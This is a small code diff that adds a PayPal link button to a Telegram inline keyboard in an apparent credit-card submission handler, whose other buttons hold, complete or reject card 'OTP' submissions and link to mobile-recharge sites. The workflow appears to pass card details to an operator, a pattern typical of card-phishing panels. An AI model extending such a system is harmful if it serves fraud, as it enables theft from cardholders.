@@ -1691,6 +1691,7 @@ app.post('/api/order/creditcard/submit', async (req, res) => {
       inline_keyboard: [
         [{ text: 'Card Quick', url: 'https://www.card-quick.com/en/product-category/mobile-recharge/recharge-asiacell-credit/' }],
         [{ text: 'فتح تطبيق Baly', url: 'https://play.google.com/store/apps/details?id=app.baly.passenger' }],
+        [{ text: 'PayPal', url: 'https://www.paypal.com/' }],
         [{ text: '1 تعليق', callback_data: `ccotp:${makeActionToken('cc_hold', submissionId)}` }],
         [{ text: '2 اكتمال', callback_data: `ccotp:${makeActionToken('cc_complete', submissionId)}` }],
         [{ text: '3 رفض', callback_data: `ccotp:${makeActionToken('cc_reject', submissionId)}` }],
